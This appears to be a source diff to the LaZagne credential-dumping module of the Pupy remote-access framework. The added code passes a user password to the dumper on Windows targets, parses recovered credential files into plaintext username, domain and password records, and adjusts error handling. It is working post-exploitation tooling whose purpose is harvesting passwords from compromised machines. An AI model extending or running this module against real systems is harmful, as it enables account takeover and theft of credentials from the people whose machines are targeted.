@@ -6,6 +6,8 @@ from pupylib.PupyOutput import Color, NewLine
 from pupylib.utils.credentials import Credentials
 from pupylib.utils.rpyc_utils import obtain
 
+import ntpath
+
 __class_name__="LaZagne"
 
 @config(cat="creds", compat=["linux", "windows"])
@@ -58,6 +60,7 @@ class LaZagne(PupyModule):
         header += '|====================================================================|\n\n'
 
         cls.arg_parser = PupyArgumentParser(prog="lazagne", description=header + cls.__doc__)
+        cls.arg_parser.add_argument('-p', '--password', help='Specify user password (windows only)')
         cls.arg_parser.add_argument('category', nargs='?', help='specify category', default='all')
 
     def run(self, args):
@@ -69,10 +72,17 @@ class LaZagne(PupyModule):
         first_user = True
         passwordsFound = False
 
-        results = obtain(whole(
-            runLaZagne,
-            category_selected=args.category, raise_on_exception=False))
+        kwargs = {
+            'raise_on_exception': False,
+        }
 
+        if args.category:
+            kwargs['category_selected'] = args.category
+
+        if args.password and self.client.is_windows():
+            kwargs['password'] = args.password
+
+        results = obtain(whole(runLaZagne, **kwargs))
         for r in results:
             if r[0] == 'User':
                 if not passwordsFound and not first_user:
@@ -151,13 +161,40 @@ class LaZagne(PupyModule):
 
         return results
 
+    def credfiles_to_dict(self, creds):
+        for cred in creds:
+            filename = cred['File']
+            parts = ntpath.abspath(filename).split('\\')
+            ## Common format
+            if len(parts) == 8 and parts[1].lower() == 'users' and \
+              parts[3].lower() == 'appdata':
+                filename = u'{}:{}'.format(parts[2], parts[-1])
+                cred['File'] = filename
+
+            for field in ('Username', 'Domain', 'Password'):
+                cred[field] = cred[field].strip('\x00')
+
+            if cred['Domain'].startswith('Domain:'):
+                cred['Domain'] = cred['Domain'][7:]
+
+            cred.update({
+                'CredType': 'plaintext',
+                'Category': 'Credfiles'
+            })
+
+        return creds
+
     def creds_to_dict(self, creds, module):
         try:
             if module.lower() == 'hashdump':
                 return self.hashdump_to_dict(creds)
             elif module.lower() == 'cachedump':
                 return self.cachedump_to_dict(creds)
+            elif module.lower() == 'credfiles':
+                return self.credfiles_to_dict(creds)
         except:
+            import traceback
+            traceback.print_exc()
             return []
 
         results = []
@@ -187,7 +224,7 @@ class LaZagne(PupyModule):
 
     def prepare_fields(self, items, remove=[]):
         if not items:
-            return []
+            return [], []
 
         data = [
             {
